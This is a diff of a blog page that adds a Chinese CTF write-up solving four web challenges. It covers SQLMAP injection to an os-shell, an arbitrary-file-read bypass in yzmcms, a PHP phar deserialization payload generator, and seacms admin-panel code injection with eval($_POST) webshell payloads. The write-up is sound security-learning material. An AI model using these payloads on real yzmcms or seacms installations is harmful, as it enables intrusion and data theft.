@@ -11,7 +11,7 @@
 
     <title>
         
-          ca01h&#39;s Blog
+          纵横杯2020-Web-WriteUp - ca01h&#39;s Blog
         
     </title>
 
@@ -303,37 +303,103 @@ function sidebar_toggle() {
 
         </div>
         <div class="book-content">
-          <div class='book-archive'>
-  <!-- Title -->
+          <div class="book-post">
   
-    <h1>Categories</h1>
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-12-28&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">1.5k</span>
   
+  <h1 id="纵横杯2020-Web-WriteUp">纵横杯2020 Web WriteUp</h1>
+<p>题目源码：</p>
+<p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A">https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A</a>  密码: dmqt</p>
+<h2 id="0x01-easycl">0x01 easycl</h2>
+<p>打开题目直接进入登录界面，有admin用户存在，弱密码无效。根据Wappalyzer提示，题目站点使用了CodeIgniter框架，通过比对题目环境的URL和CodeIgniter的三个大版本的源码，猜测应该用的是CodeIgniter4.0。前台登录有盲注存在：      可以用SQLMAP跑出数据库信息，但是进入后台没有什么用。再使用SQLMAP获取sql-shell，可以读取部分文件：        <img src="https://uploader.shimo.im/f/yKNJ4TwZFR1VppPL.png!thumbnail" alt="img">      这道题坑的地方就在于网站根目录不在/var/www/下，通过读取 /etc/apache2/sites-enabled/000-default.conf得到网站根目录/var/sercet/html再用SQL拿到os-shell，搜索flag文件        <img src="https://uploader.shimo.im/f/YEqWl1M66valOfP6.png!thumbnail" alt="img">      读取flag文件        <img src="https://uploader.shimo.im/f/D4FIVx50ohQWkJ4c.png!thumbnail" alt="img"></p>
+<h2 id="0x02-easycms">0x02 easycms</h2>
+<p>www.zip 可以下载源码查看配置文件/common/config/config.php        <img src="https://uploader.shimo.im/f/kNIkXOn14JxnvHhs.png!thumbnail" alt="img">      用admin和admin868可以成功登陆网站后台。<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/248912.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%90%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AASSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E5%AF%B9%E6%AF%94%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%A2%98%E7%9B%AE%E6%8A%8A%E6%BC%8F%E6%B4%9E%E6%8D%A2%E6%88%90%E4%BA%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%EF%BC%9A/core/class/collection.class.php">https://www.freebuf.com/vuls/248912.html这篇文章中提到了一个SSRF漏洞，代码进行对比之后，发现题目把漏洞换成了任意文件读取，文件位置：/core/class/collection.class.php</a>        <img src="https://uploader.shimo.im/f/RSvH1VN5mYRXhU0i.png!thumbnail" alt="img"></p>
+<p>然后打比赛的时候就一直卡在这，现在想想真的是蠢，忘了去看yzmcms的官方issues，我说怎么这么多人做出来了。</p>
+<p>照着这个复现一下就可以打过去：<a target="_blank" rel="noopener" href="https://github.com/yzmcms/yzmcms/issues/53">https://github.com/yzmcms/yzmcms/issues/53</a></p>
+<p>找到了洞不知道怎么利用，真的是有够菜的，还是来看看原理。</p>
+<p>当时最大的问题就是不能回显，当时我直接在网址配置中用file协议读文件：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153535.png" alt=""></p>
+<p>提交之后，点击测试采集，在phpstorm打断点调试，在运行到100行的时候，content中的内容是/etc/passwd的文件内容。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153848.png" alt=""></p>
+<p>但是在调用get_sub_content函数之后，content的值会被改变，我们跟进这个函数：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228154259.png" alt=""></p>
+<p>这个函数用了两次explode函数把content分割成一个数组，然后返回一个冒号。既然这样，我们知道flag的格式是<code>flag&#123;&#125;</code>那么把<code>start</code>改成<code>f</code>，把<code>end</code>改成<code>&#125;</code>，再经过这个函数处理后就可以保留关键的地方：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201139.png" alt=""></p>
+<p>但是问题又来了，content的内容还要经过get_all_url函数的处理，继续跟进：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201349.png" alt=""></p>
+<p>第65行preg_match_all函数提取a标签中的内容，并且在下面的foreach循环中，会接着提取href元素内容，既然如此，那么我们就把要读取的文件写在a标签的href元素中作为链接，然后封装在一个HTML文件中。</p>
+<p>例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure>
+<p>模块采集配置：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204207.png" alt=""></p>
+<p>跟进函数</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203235.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203432.png" alt=""></p>
+<p>但是在第83行还要经过url_check函数的检查，跟进：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203622.png" alt=""></p>
+<p>这个函数内部规定了只允许HTTP或HTTPS协议，于是我们用file协议会直接报错。但这种检查前四个字符的方式未免有些简单粗暴，可以使用一个PHP特性绕过：</p>
+<blockquote>
+<p>When PHP encounters an unknown protocol, it will throw a warning and set the protocol to null. When the Protoco is null or file, the local operation will be carried out. By default, the local file operation will be performed if the protocol is not transferred or the protocol does not exist.</p>
+</blockquote>
+<p>简单来说就是：当PHP遇到一个不存在的协议的时候，会把协议置空，并且当协议为空或者不存在时，会当做文件操作，即file协议。</p>
+<p>既然这样，那我们最后的payload就是：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;httpxxx:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure>
+<p>最后成功返回到content参数中：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204406.png" alt=""></p>
+<p>虽然有个warning，但是文件还是读出来了：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204838.png" alt=""></p>
+<h2 id="0x03-hellophp">0x03 hellophp</h2>
+<p>这题也挺简单的，时间都花在上面那道题目了，真的是亏死。。</p>
+<p>重点审计class.php这个文件，应该可以很明显的发现有反序列化的漏洞：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228205833.png" alt=""></p>
+<p>其中tile和comment都是可以控制的，那么利用其中一个变量即可。</p>
+<p>接着需要寻找反序列化的触发点，全局搜索没有unserialize函数后，可以很快的发现admin.php有文件上传功能，那么肯定是要上传phar压缩包触发反序列化，再找文件操作的相关函数，在index.php中有file_exist函数：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228210143.png" alt=""></p>
+<p>把phar压缩包的路径传入img参数即可触发反序列化。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line">    <span class="keyword">public</span> $comment;</span><br><span class="line">    <span class="keyword">public</span> $logo_url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$title, $comment</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title = $title;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;comment = $comment;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$title = <span class="string">&quot;1&#x27;.eval(\$_POST[a]).&#x27;a&quot;</span>;</span><br><span class="line">$comment = <span class="number">456</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line"><span class="comment">//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$A = <span class="keyword">new</span> Config($title, $comment);</span><br><span class="line">$phar-&gt;setMetadata($A);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-大家一起来审代码">0x04 大家一起来审代码</h2>
+<p>看到这种量级的代码，出题人一般都是拿别市面上的CMS，这个时候就可以先找配置文件看看，在data/common.inc.php文件中：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228213535.png" alt=""></p>
+<p>有两个信息：第一出题人用的是seacms，第二数据库的用户名和密码是admin,admin，这个也是本网站的后台密码。</p>
+<p>既然是seacms，那我们就充分发挥Google的作用：<a target="_blank" rel="noopener" href="https://lhlh22.github.io/2020/10/22/Seacms-v10-1-%E5%90%8E%E5%8F%B0getshell/#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%EF%BC%89">https://lhlh22.github.io/2020/10/22/Seacms-v10-1-后台getshell/#后台命令执行（三）</a></p>
+<p>这篇文章提到了admin_notify.php文件：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228214002.png" alt=""></p>
+<p>过滤掉了括号和反引号，那么我们就可以直接<code>include &quot;/flag&quot;;</code>即可，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;adm1n&#x2F;admin_notify.php?action&#x3D;set</span><br><span class="line">POST: notify1&#x3D;&quot;;include &quot;&#x2F;flag&quot;;&#x2F;&#x2F;&amp;notify2&#x3D;2&amp;notify3&#x3D;3</span><br></pre></td></tr></table></figure>
+<p>再访问<code>/data/admin/notify.php</code></p>
+<p>除此之外，<code>adm1n/admin_ip.php</code>也可以写入webshell：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228215247.png" alt=""></p>
+<p>不知道这个preg_match有啥用。。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: v&#x3D;&quot;;eval($_POST[1]);&#x2F;&#x2F;&amp;ip&#x3D;1.1.1.1</span><br></pre></td></tr></table></figure>
 
-  
-    <!-- Split post by year -->
-    
-  
-
-  
-      <div class="years">
-          <h2>2020</h2>
-          <ul class="archive-list-item">
-          
-			  
-              <li>
-                <span>2020-08-18</span>
-                <a href="/Web_security/ctf_writeup/11.buuctf刷题——文件上传/">
-                  buuctf刷题——文件上传
-                </a>
-              </li>
-		      
-          
-          </ul>
-      </div>
-  
-
-  
 </div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
         </div>
       </div>
       <div class="column col-2 hide-lg">
@@ -357,12 +423,23 @@ function sidebar_toggle() {
     <!-- Author title
     <div class="author-title">
       <div>ca01h</div>
-      <div></div>
+      <div>2020-12-28</div>
     </div> -->
 	
 	<script src="https://www.hackthebox.eu/badge/212159"></script>
   </div> 
 
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/CTF/">CTF</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/CTF/" rel="tag">#CTF</a>
+    </div>
+    
   
 
   <div class="divider"></div>
